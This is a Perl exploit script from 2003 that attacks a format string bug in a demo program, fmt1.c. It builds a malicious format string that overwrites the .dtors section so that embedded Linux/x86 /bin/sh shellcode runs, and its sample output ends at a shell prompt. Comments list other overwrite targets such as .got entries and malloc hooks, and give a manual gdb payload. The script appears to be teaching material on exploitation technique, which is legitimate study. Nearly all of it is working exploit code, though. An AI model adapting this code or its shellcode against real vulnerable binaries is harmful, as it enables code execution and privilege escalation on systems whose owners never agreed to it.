#!/usr/bin/perl

#
# $Id: fmt1-ex.pl,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
#
# fmt1-ex.pl - fmt1.c exploit (format string exploitation)
# Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# This is my first attempt at format string bugs exploitation. This exploit
# automagically builds a malicious format string that overwrites the .dtors
# section with the address of our shellcode (stored in environment), taking 
# control of the vulnerable program flow. In this example we choose to do 4
# writes, each one 1-byte long. Tested on Linux 2.4.x with gcc-3.2/3.3.1 (0 
# stackpops) and gcc-2.95.4 (2 stackpops).
#
# Instead of .dtors section, you can also overwrite __deregister_frame_info
# entry in .got or another function entry in .got (like exit(), and so on),
# or, if you like, main() or printf() return address locations. Other 
# interesting places are: C library hooks (__malloc_hook, __realloc_hook, 
# __free_hook), __atexit/__exit_funcs structures (static binaries only), 
# function pointers, and jumpbufs (if any).
#
# Malicious buffer structure:
# [address part] [stackpop sequence] [write string]
#
# See also http://www.team-teso.net/articles/formatstring, by scut.
# See also http://www.phrack.org/phrack/59/p59-0x07.txt, by gera and riq.
#
# Usage: ./fmt1-ex.pl <numbers of stackpops> (default = 0)
#
# $ uname -a
# Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
# $ gcc --version
# 2.95.4
# $ ./fmt1-ex.pl 2
# Using .dtors address    : 0x80495b0
# Using ret address       : 0xbfffffdc
# Using 2 stackpop(s)     : "%.10u%.10u"
# Using write string      : "%.172u%n%.35u%n%.256u%n%.192u%n"
# [...]
# sh-2.05a$
#
# NOTE. It's also possible to manually exploit this bug with a somewhat simpler
# format string, without the 256 numeric argument (and related dummy "AAAA").
# This string may be something like: (gdb) set arg `printf "\xb0\x95\x04\x08AAAA\xb1\x95\x04\x08\xb2\x95\x04\x08AAAA\xb3\x95\x04\x08"`%u%u%176u%n%35u%n%n%192u%n
#
# NOTE2. The format string may not contain char '\x25' (%). There are some ways 
# to bypass this restriction and get reliable exploitation, but this may become
# complicated pretty soon. See scut's article for more information.
#

$vuln =		"./fmt1";		# this is the vulnerable program
$dtors = 	0x080495ac + 4;		# address of first pointer in .dtors
$dummy = 	"AAAA";			# dummy double-word for stack filling

$sc = # linux/x86 shellcode (24 bytes)
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

# clean the environment
foreach $key (keys %ENV) {
	delete $ENV{$key};
}
# put our shellcode in environment
$ENV{SC} = $sc;

# calculate the ret address and split it in 4 bytes
$ret = 0xbffffffa - length($sc) - length($vuln);
$ret1 = ($ret & 0x000000ff);
$ret2 = ($ret & 0x0000ff00) >> 8;
$ret3 = ($ret & 0x00ff0000) >> 16;
$ret4 = ($ret & 0xff000000) >> 24;

# build the address part of the format string
$fmt_address =	pack("L", $dtors) . 
		$dummy .
		pack("L", $dtors + 1) .
		$dummy .
		pack("L", $dtors + 2) . 
		$dummy .
		pack("L", $dtors + 3);

# try different numbers of stackpops (default = 0)
# other valuable stackpops are: %.f (8 bytes), %*d (4 bytes), %c (4 bytes)
$fmt_stackpop = "%.10u";
$fmt_stackpop = $fmt_stackpop x $ARGV[0];

# bytes written so far (address + stackpop)
$base = length($fmt_address) + length($fmt_stackpop) * 2;

# calculate numeric arguments for the write string
$n1 = ($ret1 - $base) 			% 0x100;
$n2 = ($ret2 - $base - $n1) 		% 0x100;
$n3 = ($ret3 - $base - $n1 - $n2) 	% 0x100;
$n4 = ($ret4 - $base - $n1 - $n2 - $n3)	% 0x100;

# check for potentially dangerous numeric arguments below 10
$n1 += 0x100 if ($n1 < 10);
$n2 += 0x100 if ($n2 < 10);
$n3 += 0x100 if ($n3 < 10);
$n4 += 0x100 if ($n4 < 10);

# build the write string part of the format string
$fmt_write = 	"%." . $n1 . "u%n" .
		"%." . $n2 . "u%n" .
		"%." . $n3 . "u%n" .
		"%." . $n4 . "u%n";

# print some output
printf "Using .dtors address\t: 0x%x\n", $dtors;
printf "Using ret address\t: 0x%x\n", $ret;
printf "Using %d stackpop(s)\t: \"%s\"\n", $ARGV[0], $fmt_stackpop;
printf "Using write string\t: \"%%.%du%%n%%.%du%%n%%.%du%%n%%.%du%%n\"\n\n",
	$n1, $n2, $n3, $n4;

# build the malicious buffer
$buf = 	$fmt_address . $fmt_stackpop . $fmt_write;

# run the vulnerable program
exec $vuln, $buf;
